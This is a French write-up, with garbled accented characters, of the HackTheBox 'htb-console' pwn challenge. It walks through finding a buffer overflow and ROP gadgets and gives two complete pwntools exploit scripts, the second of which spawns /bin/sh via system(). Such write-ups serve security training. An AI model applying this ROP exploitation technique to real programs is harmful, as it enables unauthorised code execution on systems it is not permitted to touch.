# HTB-Console [Pwn] Challenge

`-- File Type --`

Le fichier est un ELF Linux 64 bit avec comme protection RX qui ne nous permet pas dâ€™exÃ©cuter de code dans le stack nous allons donc utiliser la mÃ©thode ROP return object programmation pour faire notre but final un RCE exÃ©cuter.

`-- Le programme --`

Le programme est un shell. Nous avons plusieurs commandes disponible :

- `id` nous avons le mÃªme texte dans tous les cas
- `dir` nous avons le mÃªme texte dans tous les cas
- `flag` nous permet de rentrer une entrÃ© qui surchargÃ© fais une erreur de segmentation. Car nous avons une premiÃ¨re variable nous disant que la limite dâ€™entrÃ© est de 16 mais la commande flag Ã  le droit Ã  48.
- `hof` nous permet de rentrer aussi un nombre de caractÃ¨res diffÃ©rent mais plus petit que lâ€™original.
- `ls` va nous afficher le mÃªme tableau Ã  chaque fois.
- `date` va exÃ©cuter la commande systÃ¨me â€˜dateâ€™ dans le terminal.

La partie vulnÃ©rable est la commande flag et son dÃ©faut de segmentation puisque nous devons rÃ©ussir le challenge avec un ROP nous allons devoir trouver un moment ou le programme utilise une commande systÃ¨me. 

Pour trouver ou le programme utilise une commande systÃ¨me nous pouvons utiliser lâ€™outil `objdump`

`objdump -D htb-console | grep system`

Cette commande va nous afficher tous les moment dans le code de htb-console ou une commande system est utilisÃ©

```python
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop]
â””â”€# objdump -D htb-console | grep system                                                                                              
0000000000401040 <system@plt>:
  401381:       e8 ba fc ff ff          call   401040 <system@plt>
```

On va chercher dans ghidra cette commande avec le numÃ©ro 401381

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled.png)

Pour crÃ©Ã© notre payload nous allons avoir besoin 

- Du padding savoir combien de caractÃ¨re nous avons besoin pour rÃ©Ã©crire sur le programme
- Une fonction Pop rdi dans le code
- Dâ€™un pointeur de string Ã  exÃ©cute dans le code
- Et dâ€™une exÃ©cution dâ€™une commande system dans le code

Le padding nous lâ€™obtenons avec la commande cyclic(x) cyclic_find(stack) et gdb.

La fonction pop rdi peux Ãªtre trouver avec lâ€™outil ROPgadget

`ROPgadget --binary htb-console`

On trouve dans le rÃ©sultat de la recherche un pop rdi return

`0x0000000000401473 : pop rdi ; ret`

dans ghidra 

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled%201.png)

Pour le pointeur du string nous devons trouver une commande shell exÃ©cuter par le programme comme la commande date puis retrouver son pointeur.

Avec un double clique sur le mot â€œdateâ€ dans ghidra le logiciel nous amÃ¨ne Ã  son pointeur.

0x00402107

A partir de la nous pouvons Ã©crire cette exploit :

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('htb-console Exploit')
        p=process('./htb-console')

        system_address = 0x00401381
        #payload
        padding = b'a'*24
        system = p64(system_address)
        pop_rdi = p64(0x401473)
        pointer_to_string_to_execute = p64(0x00402107)
        payload = padding + pop_rdi + pointer_to_string_to_execute + system

        p.recvuntil('>> ')
        p.sendline('flag')
        p.recvuntil('Enter flag: ')
        p.sendline(payload)

        p.interactive()

if __name__ == '__main__':
        main()
```

La seul chose quâ€™il va rÃ©ussir pour le moment est dâ€™exÃ©cuter la commande â€˜dateâ€™ dans lâ€™entrÃ© flag pas utile pour le moment mais on peux continuer la dessus.

`-- De Date Ã  root --`

Nous avons dÃ©jÃ  un exploit fonctionnel pouvant lancer la commande date sans mettre la commande prÃ©vu Ã  cette effet mais pour rÃ©ussir le challenge nous devons obtenir le root

Dans le programme htb-console nous avons un endroit ou nous pouvons mettre du texte autre que flag câ€™est hof nous avons peux de place pour mettre quelque chose mais nous pouvons voir dans ghidra que le texte Ã  un pointeur 

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled%202.png)

Nous allons donc changer lâ€™adresse pointeur de date par celle ci et nous allons avant flag mettre dans hof /bin/sh le programme en revenant sur le pointeur ou nous avons /bin/sh va exÃ©cutÃ© le shell de la machine et nous allons pouvoir Ãªtre root.

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('htb-console Exploit')
        p=process('./htb-console')

        system_address = 0x00401381
        #payload
        padding = b'a'*24
        system = p64(system_address)
        pop_rdi = p64(0x401473)
        pointer_to_string_to_execute = p64(0x004040b0)
        payload = padding + pop_rdi + pointer_to_string_to_execute + system

        p.sendlineafter('>>', 'hof')
        p.sendlineafter('Enter your name: ', '/bin/sh')
        p.recvuntil('>> ')
        p.sendline('flag')
        p.recvuntil('Enter flag: ')
        p.sendline(payload)

        p.interactive()

if __name__ == '__main__':
        main()
```

Avec cette epxloit nous sommes maintenant root de la machine et nous pouvons exÃ©cuter lâ€™exploit sur un serveur distant.